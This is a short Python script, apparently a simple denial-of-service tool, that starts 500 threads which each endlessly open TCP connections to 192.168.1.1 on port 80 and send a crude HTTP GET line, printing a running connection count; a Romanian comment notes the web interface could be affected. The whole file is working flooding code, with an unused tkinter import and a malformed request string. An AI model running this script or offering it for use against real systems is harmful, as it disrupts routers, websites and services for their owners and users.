import threading
import socket
from tkinter import *

target='192.168.1.1'
port = 80
#port 80 pentru HTML deci interfata vizuala ar putea fi afecatata

connections = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target,port))
        s.close()

        global connections
        connections += 1
        print(connections)

        #send connection in an endless loop




for i in range(500):
    thread= threading.Thread(target=attack)
    thread.start()
